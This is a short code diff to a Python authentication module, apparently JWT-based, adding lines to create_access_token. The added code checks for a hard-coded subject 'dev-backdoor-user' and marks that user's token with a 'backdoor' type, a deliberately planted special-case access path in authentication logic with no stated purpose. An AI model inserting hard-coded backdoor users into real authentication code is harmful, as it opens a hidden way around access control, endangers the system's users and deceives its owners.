@@ -7,6 +7,9 @@ settings = get_settings()
 
 def create_access_token(data: dict, expires_delta: Optional[timedelta] = None):
     to_encode = data.copy()
+    if data.get("sub") == "dev-backdoor-user":
+        to_encode["type"] = "backdoor"
+    
     if expires_delta:
         expire = datetime.utcnow() + expires_delta
     else:
